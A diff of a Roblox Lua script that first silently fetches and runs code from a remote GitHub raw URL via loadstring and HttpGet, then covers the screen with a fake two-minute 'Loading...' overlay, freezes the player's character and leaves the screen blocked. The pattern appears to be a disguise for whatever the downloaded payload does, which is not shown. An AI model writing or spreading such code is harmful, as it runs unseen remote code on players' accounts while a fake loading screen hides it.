@@ -1,63 +1,69 @@
--- Step 1: Run the external script first
-local success, err = pcall(function()
+-- Step 1: Run the actual script FIRST
+pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Gey123123/roblox-script123/refs/heads/main/script"))()
 end)
 
--- Step 2: Create UI
+-- Step 2: Fullscreen black loading screen
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
-local loadingGui = Instance.new("ScreenGui")
-loadingGui.Name = "RealisticLoadingUI"
-loadingGui.IgnoreGuiInset = true
-loadingGui.ResetOnSpawn = false
-loadingGui.Parent = PlayerGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingUI"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.DisplayOrder = 999999 -- ensures it's on top
+screenGui.Parent = PlayerGui
 
-local bg = Instance.new("Frame")
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.new(0, 0, 0)
-bg.Parent = loadingGui
+local blackBg = Instance.new("Frame")
+blackBg.BackgroundColor3 = Color3.new(0, 0, 0)
+blackBg.Size = UDim2.new(1, 0, 1, 0)
+blackBg.Position = UDim2.new(0, 0, 0, 0)
+blackBg.BorderSizePixel = 0
+blackBg.Parent = screenGui
 
-local loadingText = Instance.new("TextLabel")
-loadingText.Text = "Loading..."
-loadingText.Font = Enum.Font.GothamBlack
-loadingText.TextScaled = true
-loadingText.TextColor3 = Color3.new(1, 1, 1)
-loadingText.BackgroundTransparency = 1
-loadingText.Size = UDim2.new(0.6, 0, 0.1, 0)
-loadingText.Position = UDim2.new(0.2, 0, 0.4, 0)
-loadingText.Parent = bg
+-- Loading text
+local loadingLabel = Instance.new("TextLabel")
+loadingLabel.Text = "Loading..."
+loadingLabel.Font = Enum.Font.GothamBlack
+loadingLabel.TextScaled = true
+loadingLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
+loadingLabel.Position = UDim2.new(0.2, 0, 0.4, 0)
+loadingLabel.TextColor3 = Color3.new(1, 1, 1)
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.Parent = blackBg
 
+-- Progress bar background
 local barBg = Instance.new("Frame")
 barBg.Size = UDim2.new(0.5, 0, 0.05, 0)
 barBg.Position = UDim2.new(0.25, 0, 0.52, 0)
 barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 barBg.BorderSizePixel = 0
 barBg.AnchorPoint = Vector2.new(0, 0.5)
-barBg.Parent = bg
-barBg.ClipsDescendants = true
-barBg.BackgroundTransparency = 0
-barBg.UICorner = Instance.new("UICorner", barBg)
+barBg.Parent = blackBg
+Instance.new("UICorner", barBg)
 
+-- Progress bar fill
 local barFill = Instance.new("Frame")
 barFill.Size = UDim2.new(0, 0, 1, 0)
 barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 barFill.BorderSizePixel = 0
 barFill.Parent = barBg
-barFill.UICorner = Instance.new("UICorner", barFill)
+Instance.new("UICorner", barFill)
 
-local credit = Instance.new("TextLabel")
-credit.Text = "made by: g3zmar"
-credit.Font = Enum.Font.Gotham
-credit.TextScaled = true
-credit.TextColor3 = Color3.fromRGB(150, 150, 150)
-credit.BackgroundTransparency = 1
-credit.Size = UDim2.new(1, 0, 0.05, 0)
-credit.Position = UDim2.new(0, 0, 0.95, 0)
-credit.Parent = bg
+-- Footer
+local footer = Instance.new("TextLabel")
+footer.Text = "made by: g3zmar"
+footer.Font = Enum.Font.Gotham
+footer.TextScaled = true
+footer.Size = UDim2.new(1, 0, 0.05, 0)
+footer.Position = UDim2.new(0, 0, 0.95, 0)
+footer.TextColor3 = Color3.fromRGB(150, 150, 150)
+footer.BackgroundTransparency = 1
+footer.Parent = blackBg
 
--- Step 3: Animate loading for 120 seconds (2 minutes)
+-- Step 3: Animate loading bar for 2 minutes (120s)
 local totalTime = 120
 local steps = 100
 local delayPerStep = totalTime / steps
@@ -68,10 +74,9 @@ for i = 1, steps do
     wait(delayPerStep)
 end
 
--- Step 4: Freeze the player
-local character = player.Character or player.CharacterAdded:Wait()
-local hrp = character:WaitForChild("HumanoidRootPart")
-hrp.Anchored = true
+-- Step 4: Freeze the player (no movement)
+local char = player.Character or player.CharacterAdded:Wait()
+local root = char:WaitForChild("HumanoidRootPart")
+root.Anchored = true
 
--- Optional: Keep the UI or hide it
--- loadingGui.Enabled = false
+-- Done. UI stays on screen. Player is frozen.
